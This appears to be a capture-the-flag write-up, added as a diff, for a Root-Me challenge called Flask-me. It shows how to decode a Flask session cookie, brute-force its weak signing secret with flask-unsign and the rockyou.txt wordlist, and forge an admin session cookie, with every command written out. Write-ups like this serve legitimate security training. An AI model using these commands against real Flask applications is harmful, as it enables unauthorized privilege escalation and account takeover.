@@ -1,0 +1,31 @@
+Challenge : Flask-me’s web developer tells you that using a strong secret key is useless. Prove him wrong !
+Site : http://challenge01.root-me.org:59084/
+
+1: I only get access as "guest" early. I need to access as "admin". This site is no login page, so i think the cookie to change can access as admin.
+2: As expected, there is a cookie called "session" in "Inspect" option. This is the name of the default variable for storing the session in Flask.
+  Cookie value of "session" :
+eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.aI8j-g.gKvB77K_hplpQKeWWNAGUZaicUo
+  Cookie value of "session" :
+3: The session consists of three parts separated by dots. Very similar to JSON Web Token (JWT), but slightly different. It is a string of the form "payload.timestamp.signature".
+  Where:
+  payload — payload. JSON object in Base64 format.
+  timestamp — session lifetime. In Base64 format.
+  signature — signature. In Base64 format. Calculated using a secret key known to the web server.
+  Flask sessions have their payload in the first part. It's easy to check using any BASE64 converter.
+4: I'll decode the first part of the cookie "eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9" with "Base64 Decoder".
+  Decoded value :
+ {"admin":"false","username":"guest"}
+  Decoded value :
+5: The payload contains the username and that the user is not an admin. Authorization and authentication in one bottle (flask).
+  It is clear from the task that the secret key should not be very complex. We will select it by brute force. I'll use "flask-unsign" tool.
+  This is python package, i'll install this tool on "AWS EC2 instance". "pip3 install flask-unsign" <= Installation command.
+6: 1st step, i'll check tool is normally working or not by decoding the cookie.
+  "flask-unsign --decode --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.aI8j-g.gKvB77K_hplpQKeWWNAGUZaicUo'" <= command
+  Output:
+  {'admin': 'false', 'username': 'guest'}
+  Output:
+7: I'll find the secret key of this cookie with "rockyou.txt" wordlist. "flask-unsign" command is below:
+  "flask-unsign --wordlist rockyou.txt --unsign --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.aI8j-g.gKvB77K_hplpQKeWWNAGUZaicUo' --no-literal-eval"
+  After found the secret key, tool will stop and i can regenerate the cookie as custom.
+8: flask-unsign --sign --cookie "{'admin':'true','username':'admin'}" --secret "secret_key" <= command to generate cookie as admin
+  After generate cookie, copy that and replace in "Inspect" mode of browser. I accessed as admin and got the FLAG.
